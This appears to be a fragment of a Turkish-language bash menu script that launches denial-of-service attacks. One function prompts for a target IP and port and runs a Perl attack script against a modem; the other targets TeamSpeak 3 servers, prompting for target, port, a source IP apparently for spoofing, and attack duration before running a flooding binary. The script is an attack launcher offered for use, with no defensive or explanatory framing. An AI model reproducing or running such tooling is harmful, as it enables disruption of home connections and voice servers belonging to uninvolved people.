normal()
{
    clear
    echo -e " ${CYAN} "
	echo "  +-----------------------------------------------------------------------+ "
    echo "  ï¿½ï¿½ï¿½                          Modem SALDIRI                           ï¿½ï¿½ï¿½ "
    echo "  +-----------------------------------------------------------------------+ "                                                         
echo "Hedef :"
read ip
echo "Port :"
read port
perl ByWinchester.pl  $ip  $port 
}

guclu()
{
    clear
    echo -e " ${CYAN} "
	echo "  +-----------------------------------------------------------------------+ "
    echo "  ï¿½ï¿½ï¿½                          Teamspeak SALDIRI                        ï¿½ï¿½ï¿½ "
    echo "  ï¿½ï¿½ï¿½                          TS3 Sunuculari Icin Etkilidir.           ï¿½ï¿½ï¿½ "
    echo "  +-----------------------------------------------------------------------+ "                                                         
echo "Hedef :"
read ip
echo "Port :"
read port
echo "Modem Ip'niz :"
read modem
echo "Saniye(Kac Saniye Saldiri Atilsin?) :"
read saniye
./WincOld -r $ip -p $port -z 0 -s $modem -t $saniye
}

